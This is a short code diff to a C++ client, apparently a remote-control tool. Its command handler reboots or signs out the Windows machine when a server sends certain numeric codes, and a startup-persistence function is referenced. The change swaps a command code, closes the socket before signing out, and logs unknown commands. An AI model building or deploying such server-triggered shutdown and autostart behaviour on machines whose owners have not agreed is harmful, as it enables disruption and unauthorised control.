@@ -67,12 +67,15 @@ void HandleCommands(std::string command, SOCKET sock) {
 		send(sock, "ok", 2, 0);
 		std::this_thread::sleep_for(std::chrono::seconds(2));	
 		system("shutdown /r");	
-	} else if (command == "126773") {
+	} else if (command == "837453") {
 		std::cout << "[!] Server sent a lock signal.\n"; // lock
 		send(sock, "ok", 2, 0);
 		std::this_thread::sleep_for(std::chrono::seconds(2));	
-		ExitWindows(0, 0);
-	}
+        closesocket(sock);      // close before signing out
+		ExitWindowsEx(0, 0);
+	} else {
+        std::cout << "[!] Server sent this unknown command: " << command << "\n";
+    }
 }
 
 void SaveOnStartUp() {
